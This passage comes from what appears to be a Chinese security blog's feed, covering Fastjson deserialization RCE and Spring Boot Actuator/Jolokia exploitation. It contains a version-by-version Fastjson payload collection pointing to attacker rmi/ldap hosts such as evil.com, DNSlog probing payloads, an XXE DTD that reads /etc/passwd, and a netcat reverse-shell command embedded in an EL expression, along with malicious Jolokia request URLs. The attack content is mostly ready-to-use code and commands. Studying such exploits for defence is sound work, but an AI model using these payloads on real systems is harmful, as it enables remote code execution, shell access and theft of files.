class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is));<br><br>        String line;<br>        <span class="hljs-keyword">while</span>((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            System.out.println(line);<br>        &#125;<br><br>        p.waitFor();<br>        is.close();<br>        reader.close();<br>        p.destroy();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211004223821832.png" alt="image-20211004223821832"></p><p>反弹成功</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211004223851516.png" alt="image-20211004223851516"></p><h2 id="0x05-简化版工具"><a href="#0x05-简化版工具" class="headerlink" title="0x05 简化版工具"></a>0x05 简化版工具</h2><p><a href="https://github.com/wyzxxz/fastjson_rce_tool">https://github.com/wyzxxz/fastjson_rce_tool</a></p><h2 id="0x06-漏洞检测"><a href="#0x06-漏洞检测" class="headerlink" title="0x06 漏洞检测"></a>0x06 漏洞检测</h2><h3 id="未知目标是否使用fastjson，可以报错回显"><a href="#未知目标是否使用fastjson，可以报错回显" class="headerlink" title="未知目标是否使用fastjson，可以报错回显"></a>未知目标是否使用fastjson，可以报错回显</h3><p>如果站点报错回显，可以不闭合花括号进行报错回显，往往字符带有fastjsion</p><h3 id="无回显，通过DNS回显的方式区分-Fastjson和Jackson"><a href="#无回显，通过DNS回显的方式区分-Fastjson和Jackson" class="headerlink" title="无回显，通过DNS回显的方式区分 Fastjson和Jackson"></a>无回显，通过DNS回显的方式区分 Fastjson和Jackson</h3><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211004224812379.png" alt="image-20211004224812379"></p><p>使用以下payload测试</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;zeo&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;745shj.dnslog.cn&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211004224736803.png" alt="image-20211004224736803"></p><h3 id="最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson"><a href="#最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson" class="headerlink" title="最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson"></a>最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet6Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>畸形的</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="hljs-string">&quot;address&quot;</span>:,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjMxNTAucG5n?x-oss-process=image/format,png" alt="img"></p><p>POC:</p><p>要嵌套在里面zeo里面</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;zeo&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet6Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="hljs-string">&quot;address&quot;</span>:,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>, &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<span class="hljs-string">&quot;&quot;</span>&#125;<br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;:<span class="hljs-string">&quot;aaa&quot;</span>&#125;<br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;]<br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;:<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="0x07-多版本payload集合"><a href="#0x07-多版本payload集合" class="headerlink" title="0x07 多版本payload集合"></a>0x07 多版本payload集合</h2><p>影响版本：</p><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24"></a>fastjson&lt;&#x3D;1.2.24</h3><p>exp：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&quot;<span class="hljs-keyword">@type</span><span class="hljs-string">&quot;:&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-string">&quot;,&quot;</span>dataSourceName<span class="hljs-string">&quot;:&quot;</span><span class="hljs-attribute">rmi</span>://x.x.x.<span class="hljs-attribute">x</span>:<span class="hljs-number">1099</span>/jndi<span class="hljs-string">&quot;, &quot;</span>autoCommit<span class="hljs-string">&quot;:true&#125;</span><br></code></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-1"><a href="#fastjson-1" class="headerlink" title="fastjson&lt;&#x3D;1.2.41"></a>fastjson&lt;&#x3D;1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p><p>exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://x.x.x.x:1098/jndi&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-2"><a href="#fastjson-2" class="headerlink" title="fastjson&lt;&#x3D;1.2.42"></a>fastjson&lt;&#x3D;1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p><p>exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1399/Exploit&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-3"><a href="#fastjson-3" class="headerlink" title="fastjson&lt;&#x3D;1.2.43"></a>fastjson&lt;&#x3D;1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p><p>exp：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&quot;<span class="hljs-keyword">@type</span><span class="hljs-string">&quot;:&quot;</span>[com.sun.rowset.JdbcRowSetImpl<span class="hljs-string">&quot;[&#123;,&quot;</span>dataSourceName<span class="hljs-string">&quot;:&quot;</span><span class="hljs-attribute">ldap</span>://<span class="hljs-attribute">localhost</span>:<span class="hljs-number">1399</span>/Exploit<span class="hljs-string">&quot;, &quot;</span>autoCommit<span class="hljs-string">&quot;:true&#125;</span><br></code></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-4"><a href="#fastjson-4" class="headerlink" title="fastjson&lt;&#x3D;1.2.45"></a>fastjson&lt;&#x3D;1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p><p>exp：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&quot;<span class="hljs-keyword">@type</span><span class="hljs-string">&quot;:&quot;</span>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory<span class="hljs-string">&quot;,&quot;</span>properties<span class="hljs-string">&quot;:&#123;&quot;</span>data_source<span class="hljs-string">&quot;:&quot;</span><span class="hljs-attribute">ldap</span>://<span class="hljs-attribute">localhost</span>:<span class="hljs-number">1399</span>/Exploit<span class="hljs-string">&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-5"><a href="#fastjson-5" class="headerlink" title="fastjson&lt;&#x3D;1.2.47"></a>fastjson&lt;&#x3D;1.2.47</h3><p>exp：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>, <br>        <span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;, <br>    <span class="hljs-string">&quot;b&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, <br>        <span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://x.x.x.x:1999/Exploit&quot;</span>, <br>        <span class="hljs-string">&quot;autoCommit&quot;</span>: true<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-6"><a href="#fastjson-6" class="headerlink" title="fastjson&lt;&#x3D;1.2.62"></a>fastjson&lt;&#x3D;1.2.62</h3><p>exp：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&quot;<span class="hljs-keyword">@type</span><span class="hljs-string">&quot;:&quot;</span>org.apache.xbean.propertyeditor.JndiConverter<span class="hljs-string">&quot;,&quot;</span>AsText<span class="hljs-string">&quot;:&quot;</span><span class="hljs-attribute">rmi</span>://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1098</span>/exploit<span class="hljs-string">&quot;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-7"><a href="#fastjson-7" class="headerlink" title="fastjson&lt;&#x3D;1.2.66"></a>fastjson&lt;&#x3D;1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p><p>exp：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="hljs-string">&quot;resourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="hljs-string">&quot;jndiNames&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="hljs-string">&quot;properties&quot;</span>: &#123;<br></code></pre></td></tr></table></figure><h2 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><p>更换了payload</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://evil.com:9999/Exploit&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>:true<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>在服务器上生成恶意class类，确保可以访问</li><li>在服务器开启远程调用，可以使用 rmi或者ldap，视payload而定</li><li>检测漏洞可以用 报错信息检测，或者Dnslog平台检测。</li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring boot 漏洞</title>
    <link href="/2021/06/10/Spring%20Boot/"/>
    <url>/2021/06/10/Spring%20Boot/</url>
    
    <content type="html"><![CDATA[<h1 id="Spring-boot-RCE"><a href="#Spring-boot-RCE" class="headerlink" title="Spring boot RCE"></a>Spring boot RCE</h1><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块。其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：</p><table><thead><tr><th>Http 方法</th><th>路径</th><th>描述</th></tr></thead><tbody><tr><td>get</td><td>&#x2F;autoconfig</td><td>提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</td></tr><tr><td>get</td><td>&#x2F;configprops</td><td>描述配置属性（包含默认值）如何注入 Bean</td></tr><tr><td>get</td><td>&#x2F;beans</td><td>描述应用程序上下文里全部的 Bean，以及它们的关系</td></tr><tr><td>get</td><td>&#x2F;dump</td><td>获取线程活动的快照</td></tr><tr><td>get</td><td>&#x2F;env</td><td>获取全部环境属性</td></tr><tr><td>get</td><td>&#x2F;env&#x2F;{name}</td><td>根据名称获取特定的环境属性值</td></tr><tr><td>get</td><td>&#x2F;health</td><td>报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供</td></tr><tr><td>get</td><td>&#x2F;info</td><td>获取应用程序的定制信息，这些信息由 info 打头的属性提供</td></tr><tr><td>get</td><td>&#x2F;mappings</td><td>描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系</td></tr><tr><td>get</td><td>&#x2F;metrics</td><td>报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</td></tr><tr><td>get</td><td>&#x2F;metrics&#x2F;{name}</td><td>报告指定名称的应用程序度量值</td></tr><tr><td>post</td><td>&#x2F;shutdown</td><td>关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）</td></tr><tr><td>get</td><td>&#x2F;trace</td><td>提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）</td></tr></tbody></table><ul><li>Spring Boot 1.x版本端点在根URL下注册</li><li><em>2.x版本端点移动到&#x2F;actuator&#x2F;路径</em></li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">git</span> clone https:<span class="hljs-comment">//github.com/veracode-research/actuator-testbed.git</span><br><span class="hljs-keyword">mvn</span> install    \\编译环境<br><span class="hljs-keyword">mvn</span> spring-boot:run   \\启动<br></code></pre></td></tr></table></figure><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211005114951672.png" alt="image-20211005114951672"></p><p>启动</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211005145900371.png" alt="image-20211005145900371"></p><p>这里我使用的是虚拟机，采取端口转发，将端口映射到本地访问</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">本地访问<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:port1</span>就是<span class="hljs-symbol">host:</span>port2(用的更多)<br><br>ssh -<span class="hljs-title class_">CfNg</span> -L <span class="hljs-symbol">port2:</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:port1</span> user<span class="hljs-variable">@host</span>  <br></code></pre></td></tr></table></figure><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211005150817492.png" alt="image-20211005150817492"></p><h2 id="Jolokia漏洞利用"><a href="#Jolokia漏洞利用" class="headerlink" title="Jolokia漏洞利用"></a>Jolokia漏洞利用</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Jolokia 是一个用来访问远程 JMX MBeans 的崭新方法，与 JSR-160 连接器不同的是，它<code>使用基于 HTTP 的 JSON 格式作为通讯协议，提供 JMX 批量操作等。</code></p><h3 id="Jolokia漏洞利用（XXE）"><a href="#Jolokia漏洞利用（XXE）" class="headerlink" title="Jolokia漏洞利用（XXE）"></a>Jolokia漏洞利用（XXE）</h3><ul><li>jolokia&#x2F;list</li></ul><p><strong>查看jolokia&#x2F;list中存在的<a href="http://www.tianshouzhi.com/api/tutorials/jmx/33">Mbeans</a>，是否存在logback库提供的reloadByURL方法</strong></p><p><strong>jolokia在logback JMXConfigurator中提供的“reloadByURL”方法允许从外部URL重新加载日志的记录配置</strong></p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211005152259958.png" alt="image-20211005152259958"></p><ul><li>创建logback.xml（指向恶意文件）和fileread.dtd（执行恶意命令）文件</li></ul><p>logback.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [ <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.0.104/fileread.dtd&quot;</span>&gt;</span>%remote;%int;]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;trick;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>fileread.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#x27;:%d;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure><p> 将文件上传到服务器并开启http服务</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211005154347721.png" alt="image-20211005154347721"></p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211005154358986.png" alt="image-20211005154358986"></p><p>远程访问logback.xml文件</p><p>最终访问：</p><p><code>http://192.168.0.104:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/192.168.0.104!/logback.xml</code></p><p>成功读取</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211005154524399.png" alt="image-20211005154524399"></p><h4 id="jolokia漏洞利用（RCE）"><a href="#jolokia漏洞利用（RCE）" class="headerlink" title="jolokia漏洞利用（RCE）"></a>jolokia漏洞利用（RCE）</h4><p>可以在logback.xml中使用insertFromJNDI标签，这个标签允许我们从 JNDI 加载变量，导致了rce漏洞产生。<br>rce的流程主要分为4步。<a href="https://links.jianshu.com/go?to=https://www.secshi.com/21506.html">详细过程</a></p><ol><li>构造 Get 请求访问目标，使其去外部服务器加载恶意 logback.xml 文件。</li><li>解析 logback.xml 时，最终会触发 InitialContext.lookup(URI) 操作，而URI 为恶意 RMI 服务地址。</li><li>恶意 RMI 服务器向目标返回一个 Reference 对象，Reference 对象中指定了目标本地存在的 BeanFactory 类，以及Bean Class 的类名、属性、属性值（这里为 ELProcessor 、x、eval(…))。</li><li>目标在进行 lookup() 操作时，会动态加载并实例化 BeanFactory 类，接着调用 factory.getObjectInstance() 方法，通过反射的方式实例化 Reference 所指向的任意 Bean Class，并且会调用 setter 方法为所有的属性赋值。对应我们的代码，最终调用 setter 方法的时候，就是执行如下代码：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ELProcessor.<span class="hljs-built_in">eval</span>(\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).<span class="hljs-built_in">eval</span>(\&quot;new java.lang.ProcessBuilder[<span class="hljs-string">&#x27;(java.lang.String[])&#x27;</span>]([<span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc evil-server-ip port &gt;/tmp/f&#x27;</span>]).start()\&quot;<br></code></pre></td></tr></table></figure><p>而 ELProcessor.eval() 会对 EL 表达式（这里为反弹 shell）进行求值，最终达到 RCE 的效果。</p><p>下载利用代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mpgn/</span>Spring-Boot-Actuator-Exploit<br></code></pre></td></tr></table></figure><p>修改RMI远程监听的端口，和反弹shell的地址和端口</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008100030235.png" alt="image-20211008100030235"></p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008100040684.png" alt="image-20211008100040684"></p><p>使用maven对代码进行编译</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008100129331.png" alt="image-20211008100129331"></p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008100153409.png" alt="image-20211008100153409"></p><p>可以看到编译成功了</p><p>在本地开启http服务，保证文件可以被正常访问</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008100241551.png" alt="image-20211008100241551"></p><p>修改logback.xml文件内容</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">configuration</span>&gt;<br>&lt;insertFromJNDI env-entry-<span class="hljs-type">name</span>=&quot;rmi://192.168.0.104:1097/jndi&quot; <span class="hljs-keyword">as</span>=&quot;appName&quot; /&gt;<br>&lt;/<span class="hljs-keyword">configuration</span>&gt;<br></code></pre></td></tr></table></figure><p>执行RMIServer-0.1.0.jar文件,开启攻击机上的RMI监听时需要通过’Djava.rmi.server.hostname&#x3D;x.x.x.x’指定自己的RMI监听的外网地址。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -Djava.rmi.server.hostname=<span class="hljs-number">192.168.0.104</span> -jar RMIServer-<span class="hljs-number">0</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.jar<br></code></pre></td></tr></table></figure><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008101446794.png" alt="image-20211008101446794"></p><p>发送恶意请求</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">0.104</span>:<span class="hljs-number">8090</span><span class="hljs-regexp">/jolokia/</span>exec<span class="hljs-regexp">/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/</span>reloadByURL<span class="hljs-regexp">/http:!/</span>!<span class="hljs-regexp">/192.168.0.104!/</span>logback.xml<br></code></pre></td></tr></table></figure><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008102825414.png" 